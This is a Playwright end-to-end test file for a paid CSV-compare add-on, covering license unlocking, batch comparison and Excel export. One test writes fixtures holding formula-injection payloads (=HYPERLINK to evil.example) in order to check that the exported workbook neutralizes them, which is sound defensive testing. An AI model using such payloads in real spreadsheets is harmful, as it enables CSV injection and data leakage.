import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import http from 'node:http';
import fs from 'node:fs';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';
import ExcelJSModule from 'exceljs';
import { collectPageErrors } from './helpers/collectPageErrors.mjs';

const ExcelJS = ExcelJSModule.default || ExcelJSModule;

/**
 * End-to-end tests for Compare-CSV Pro, the paid batch/Excel-report add-on: drives
 * the built dist/ output in a real headless browser. Requires `npm run
 * build` to have already produced dist/.
 *
 * No real Gumroad product exists yet (gumroadBuyUrl/gumroadProductPermalink
 * are both null in src/tools/compare-csv.js until a human creates one), so
 * two things are tested two different ways:
 *   - The as-shipped locked/"coming soon" state is tested directly against
 *     the real built page, no mocking needed.
 *   - The license-code-entry UI and the unlock transition need a
 *     product_permalink to exist for the UI to render at all (see
 *     compareCsvPro.client.js's own design) -- tested by intercepting the
 *     page RESPONSE itself (page.route on the page URL) to inject a real
 *     data-gumroad-product attribute, the same class of technique already
 *     used elsewhere on this site to reproduce specific rendered states,
 *     plus page.route on the actual Gumroad API URL to return a real,
 *     structurally-correct success/failure JSON body -- never a fake
 *     internal flag standing in for the real network response shape.
 *   - The unlocked batch-compare + Excel-export flow is tested by
 *     pre-seeding localStorage's real unlock key before navigation (exactly
 *     the same state a real returning purchaser would be in) and then
 *     driving the actual rendered UI.
 */

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(__dirname, '..');
const DIST = path.join(ROOT, 'dist');
const TMP = path.join(ROOT, 'tmp_test');

const CONTENT_TYPES = {
  '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8',
  '.xml': 'application/xml; charset=utf-8', '.txt': 'text/plain; charset=utf-8',
  '.csv': 'text/csv; charset=utf-8',
};

const BASE_PREFIX = '/filetools/';

function startServer(root, prefix) {
  return new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      let p = decodeURIComponent(new URL(req.url, 'http://localhost').pathname);
      if (p.startsWith(prefix)) p = p.slice(prefix.length - 1);
      if (p.endsWith('/') || p === '') p += 'index.html';
      const resolved = path.join(root, p);
      fs.readFile(resolved, (err, data) => {
        if (err) { res.writeHead(404); res.end('not found: ' + p); return; }
        const ext = path.extname(resolved).toLowerCase();
        res.writeHead(200, { 'Content-Type': CONTENT_TYPES[ext] || 'application/octet-stream' });
        res.end(data);
      });
    });
    server.listen(0, 'localhost', () => resolve(server));
  });
}

let server;
let browser;
let baseUrl;
let pageUrl;

before(async () => {
  assert.ok(fs.existsSync(DIST), 'dist/ does not exist -- run `npm run build` before `npm test`.');
  fs.mkdirSync(TMP, { recursive: true });

  // Batch A and Batch B each get their OWN copy of a file with the SAME
  // name ("pair1.csv" exists in both batches, "pair2.csv" exists in both
  // batches) -- pairing matches by identical filename stem across the two
  // batches, so each pair lives in its own subdirectory here purely so two
  // same-named files can coexist on disk for the test fixture; what
  // Playwright uploads is still just the bare filename in each case.
  fs.mkdirSync(path.join(TMP, 'pro-batch-a'), { recursive: true });
  fs.mkdirSync(path.join(TMP, 'pro-batch-b'), { recursive: true });
  fs.writeFileSync(path.join(TMP, 'pro-batch-a', 'pair1.csv'), 'ID,Amount\r\n1,10\r\n2,20\r\n');
  fs.writeFileSync(path.join(TMP, 'pro-batch-b', 'pair1.csv'), 'ID,Amount\r\n1,10\r\n2,25\r\n');
  fs.writeFileSync(path.join(TMP, 'pro-batch-a', 'pair2.csv'), 'ID,Amount\r\n5,50\r\n');
  fs.writeFileSync(path.join(TMP, 'pro-batch-b', 'pair2.csv'), 'ID,Amount\r\n5,50\r\n');
  fs.writeFileSync(path.join(TMP, 'pro-batch-a', 'unmatched.csv'), 'ID,Amount\r\n9,90\r\n');

  server = await startServer(DIST, BASE_PREFIX);
  baseUrl = `http://localhost:${server.address().port}${BASE_PREFIX}`;
  pageUrl = `${baseUrl}data/compare-csv/`;
  browser = await chromium.launch();
});

after(async () => {
  await browser.close();
  await new Promise((resolve) => server.close(resolve));
});

test('Compare-CSV Pro: as shipped (no product configured yet), shows an honest "coming soon" state, never a live-looking broken link', async () => {
  const page = await browser.newPage();
  const errors = collectPageErrors(page);
  await page.goto(pageUrl, { waitUntil: 'networkidle' });

  const proSection = page.locator('.pro-feature');
  await proSection.waitFor();
  const text = await proSection.textContent();
  assert.match(text, /coming soon/i);
  assert.equal(await proSection.locator('a').count(), 0, 'no purchase link should render until a real Gumroad product exists');
  assert.equal(await proSection.locator('input#pro-license-input').count(), 0, 'no unlock-code box should render until a real product_permalink exists to verify against');

  assert.deepEqual(errors, []);
  await page.close();
});

/**
 * Injects a real `data-gumroad-product` attribute into the served page's
 * HTML before the browser parses it -- reproduces the exact state the page
 * will be in once a human fills in src/tools/compare-csv.js's
 * gumroadProductPermalink, without needing a real Gumroad product for this
 * test run.
 */
async function gotoWithFakeProductConfigured(page) {
  await page.route(pageUrl, async (route) => {
    const response = await route.fetch();
    const body = await response.text();
    const patched = body.replace('<section class="pro-feature"', '<section class="pro-feature" data-gumroad-product="test-permalink"');
    assert.notEqual(patched, body, 'the fixture-injection replace() did not match -- toolPage.js\'s pro-feature markup shape changed');
    await route.fulfill({ response, body: patched });
  });
  await page.goto(pageUrl, { waitUntil: 'networkidle' });
}

test('Compare-CSV Pro: with a product configured, an invalid unlock code shows Gumroad\'s own real error text, does not unlock', async () => {
  const page = await browser.newPage();
  await page.route('https://api.gumroad.com/v2/licenses/verify', (route) => route.fulfill({
    status: 200,
    contentType: 'application/json',
    body: JSON.stringify({ success: false, message: 'That license does not exist for the provided product.' }),
  }));
  await gotoWithFakeProductConfigured(page);

  await page.locator('#pro-license-input').fill('WRONG-CODE');
  await page.locator('button:has-text("Unlock")').click();

  await page.waitForFunction(() => {
    const el = document.querySelector('.pro-feature .alert-danger');
    return el && /does not exist/i.test(el.textContent || '');
  }, { timeout: 5000 });

  const stillLocked = await page.evaluate(() => localStorage.getItem('compare-csv-pro-unlocked'));
  assert.notEqual(stillLocked, 'true');
  assert.equal(await page.locator('.pro-feature input[type="file"]').count(), 0, 'batch UI must not appear on a failed unlock');
  await page.close();
});

test('Compare-CSV Pro: a real successful verify response unlocks the batch UI and persists the flag', async () => {
  const page = await browser.newPage();
  let requestBody = null;
  await page.route('https://api.gumroad.com/v2/licenses/verify', async (route) => {
    requestBody = route.request().postData();
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ success: true, uses: 1, purchase: { email: 'buyer@example.com' } }),
    });
  });
  await gotoWithFakeProductConfigured(page);

  await page.locator('#pro-license-input').fill('REAL-VALID-CODE');
  await page.locator('button:has-text("Unlock")').click();

  await page.waitForSelector('.pro-feature input[type="file"]');
  assert.match(requestBody || '', /product_permalink=test-permalink/);
  assert.match(requestBody || '', /license_key=REAL-VALID-CODE/);

  const unlockedFlag = await page.evaluate(() => localStorage.getItem('compare-csv-pro-unlocked'));
  assert.equal(unlockedFlag, 'true');
  await page.close();
});

test('Compare-CSV Pro: a returning purchaser (unlock flag already in localStorage) sees the batch UI immediately, no code re-entry', async () => {
  const page = await browser.newPage();
  await page.addInitScript(() => { window.localStorage.setItem('compare-csv-pro-unlocked', 'true'); });
  await page.goto(pageUrl, { waitUntil: 'networkidle' });

  await page.waitForSelector('.pro-feature input[type="file"]');
  assert.equal(await page.locator('.pro-feature input#pro-license-input').count(), 0);
  await page.close();
});

test('Compare-CSV Pro: batch compare matches pairs by filename, reports an unmatched file honestly, and does not touch the free single-pair tool above it', async () => {
  const page = await browser.newPage();
  const errors = collectPageErrors(page);
  await page.addInitScript(() => { window.localStorage.setItem('compare-csv-pro-unlocked', 'true'); });
  await page.goto(pageUrl, { waitUntil: 'networkidle' });

  const fileInputs = page.locator('.pro-feature input[type="file"]');
  await fileInputs.nth(0).setInputFiles([
    path.join(TMP, 'pro-batch-a', 'pair1.csv'),
    path.join(TMP, 'pro-batch-a', 'pair2.csv'),
    path.join(TMP, 'pro-batch-a', 'unmatched.csv'),
  ]);
  await fileInputs.nth(1).setInputFiles([
    path.join(TMP, 'pro-batch-b', 'pair1.csv'),
    path.join(TMP, 'pro-batch-b', 'pair2.csv'),
  ]);
  await page.locator('.pro-feature button:has-text("Compare batch")').click();

  await page.waitForSelector('.pro-feature .table-block table');
  const rowTexts = await page.locator('.pro-feature .table-block table tbody tr').allTextContents();
  assert.equal(rowTexts.length, 2, 'exactly the two matched pairs, not the unmatched file');
  assert.ok(rowTexts.some((t) => /pair1\.csv.*pair1\.csv/.test(t) && /1/.test(t)), 'pair1/pair1 pair should show 1 changed row');
  assert.ok(rowTexts.some((t) => /pair2\.csv.*pair2\.csv/.test(t)), 'pair2/pair2 pair should be listed');

  const unmatchedNote = await page.locator('.pro-feature .table-block .alert-warn').textContent();
  assert.match(unmatchedNote, /unmatched\.csv/);

  // The free single-pair tool above it is untouched by any of this.
  assert.equal(await page.locator('#tool .result').isHidden(), true);

  assert.deepEqual(errors, []);
  await page.close();
});

test('Compare-CSV Pro: the downloaded combined-diff.xlsx is a real workbook, one sheet per pair, with real changed-cell values and fill highlighting', async () => {
  const page = await browser.newPage({ acceptDownloads: true });
  await page.addInitScript(() => { window.localStorage.setItem('compare-csv-pro-unlocked', 'true'); });
  await page.goto(pageUrl, { waitUntil: 'networkidle' });

  const fileInputs = page.locator('.pro-feature input[type="file"]');
  await fileInputs.nth(0).setInputFiles([path.join(TMP, 'pro-batch-a', 'pair1.csv'), path.join(TMP, 'pro-batch-a', 'pair2.csv')]);
  await fileInputs.nth(1).setInputFiles([path.join(TMP, 'pro-batch-b', 'pair1.csv'), path.join(TMP, 'pro-batch-b', 'pair2.csv')]);
  await page.locator('.pro-feature button:has-text("Compare batch")').click();
  await page.waitForSelector('.pro-feature .table-block table');

  const [download] = await Promise.all([
    page.waitForEvent('download', { timeout: 15000 }),
    page.locator('button:has-text("Download combined-diff.xlsx")').click(),
  ]);
  assert.equal(download.suggestedFilename(), 'combined-diff.xlsx');
  const outPath = path.join(TMP, 'pro-combined-out.xlsx');
  await download.saveAs(outPath);

  const workbook = new ExcelJS.Workbook();
  await workbook.xlsx.readFile(outPath);
  assert.deepEqual(workbook.worksheets.map((s) => s.name).sort(), ['pair1', 'pair2'].sort());

  const sheet1 = workbook.getWorksheet('pair1');
  assert.deepEqual(sheet1.getRow(1).values.slice(1), ['Status', 'ID', 'Amount']);
  const changedRow = sheet1.getRow(3);
  assert.equal(changedRow.getCell(1).value, 'changed');
  assert.equal(changedRow.getCell(3).value, '20 → 25');
  const fillArgb = changedRow.getCell(1).fill && changedRow.getCell(1).fill.fgColor && changedRow.getCell(1).fill.fgColor.argb;
  assert.equal(fillArgb, 'FFFFF3CD');

  const sheet2 = workbook.getWorksheet('pair2');
  const unchangedRow = sheet2.getRow(2);
  assert.equal(unchangedRow.getCell(1).value, 'unchanged');
  assert.equal(unchangedRow.getCell(1).fill, undefined, 'an unchanged row should carry no fill override');

  await page.close();
});

test('Compare-CSV Pro: a real formula-injection payload in an uploaded file is neutralized in the real downloaded workbook, not just asserted in isolation', async () => {
  fs.mkdirSync(path.join(TMP, 'pro-batch-a-injection'), { recursive: true });
  fs.mkdirSync(path.join(TMP, 'pro-batch-b-injection'), { recursive: true });
  // Row ID 1: a real formula-injection payload (a hyperlink-based
  // data-exfiltration shape, the same class OWASP's CSV-injection writeup
  // uses as its own example) as the OLD value -- since a "changed" cell's
  // combined "old → new" text always starts with the OLD value, this is
  // the shape that actually puts a dangerous leading character at the
  // start of the real exported cell (a payload as the NEW value, with a
  // benign old value, would sit mid-string and never reach Excel's own
  // formula-detection rule -- not a real risk, correctly not what this
  // test targets). Row ID 2: the same payload as a plain ADDED-row value,
  // the more common real-world shape (a single untrusted cell, no
  // concatenation at all).
  fs.writeFileSync(path.join(TMP, 'pro-batch-a-injection', 'payload.csv'), 'ID,Note\r\n1,=HYPERLINK("https://evil.example/old")\r\n');
  fs.writeFileSync(path.join(TMP, 'pro-batch-b-injection', 'payload.csv'), 'ID,Note\r\n1,safe-updated\r\n2,=HYPERLINK("https://evil.example/added")\r\n');

  const page = await browser.newPage({ acceptDownloads: true });
  await page.addInitScript(() => { window.localStorage.setItem('compare-csv-pro-unlocked', 'true'); });
  await page.goto(pageUrl, { waitUntil: 'networkidle' });

  const fileInputs = page.locator('.pro-feature input[type="file"]');
  await fileInputs.nth(0).setInputFiles(path.join(TMP, 'pro-batch-a-injection', 'payload.csv'));
  await fileInputs.nth(1).setInputFiles(path.join(TMP, 'pro-batch-b-injection', 'payload.csv'));
  await page.locator('.pro-feature button:has-text("Compare batch")').click();
  await page.waitForSelector('.pro-feature .table-block table');

  const [download] = await Promise.all([
    page.waitForEvent('download', { timeout: 15000 }),
    page.locator('button:has-text("Download combined-diff.xlsx")').click(),
  ]);
  const outPath = path.join(TMP, 'pro-injection-out.xlsx');
  await download.saveAs(outPath);

  const workbook = new ExcelJS.Workbook();
  await workbook.xlsx.readFile(outPath);
  const sheet = workbook.getWorksheet('payload');

  // Both cells must hold a plain, inert string starting with a single quote
  // -- never an actual ExcelJS formula object (which would mean the payload
  // survived as a real, executable formula in the downloaded file).
  const changedCell = sheet.getRow(2).getCell(3);
  assert.equal(typeof changedCell.value, 'string');
  assert.ok(changedCell.value.startsWith("'="), `changed-row cell: expected a neutralized leading quote, got: ${changedCell.value}`);
  assert.match(changedCell.value, /HYPERLINK/);

  const addedCell = sheet.getRow(3).getCell(3);
  assert.equal(typeof addedCell.value, 'string');
  assert.ok(addedCell.value.startsWith("'="), `added-row cell: expected a neutralized leading quote, got: ${addedCell.value}`);
  assert.match(addedCell.value, /HYPERLINK/);

  await page.close();
});

test('Compare-CSV Pro: an oversized batch file is refused before any file content is read, naming the offender', async () => {
  const page = await browser.newPage();
  await page.addInitScript(() => { window.localStorage.setItem('compare-csv-pro-unlocked', 'true'); });
  await page.goto(pageUrl, { waitUntil: 'networkidle' });

  const fileInputs = page.locator('.pro-feature input[type="file"]');
  const oversized = Buffer.alloc(21 * 1024 * 1024, 'a,b\n'.charCodeAt(0));
  await fileInputs.nth(0).setInputFiles([
    { name: 'huge-batch-a.csv', mimeType: 'text/csv', buffer: oversized },
  ]);
  await fileInputs.nth(1).setInputFiles([path.join(TMP, 'pro-batch-b', 'pair1.csv')]);
  await page.locator('.pro-feature button:has-text("Compare batch")').click();

  await page.waitForFunction(() => {
    const el = document.querySelector('.pro-feature .alert-danger');
    return el && /too large/i.test(el.textContent || '');
  }, { timeout: 5000 });
  const msg = await page.locator('.pro-feature .alert-danger').textContent();
  assert.match(msg, /huge-batch-a\.csv/);
  assert.equal(await page.locator('.pro-feature .table-block').count(), 0, 'nothing should have reached the diff engine');
  await page.close();
});
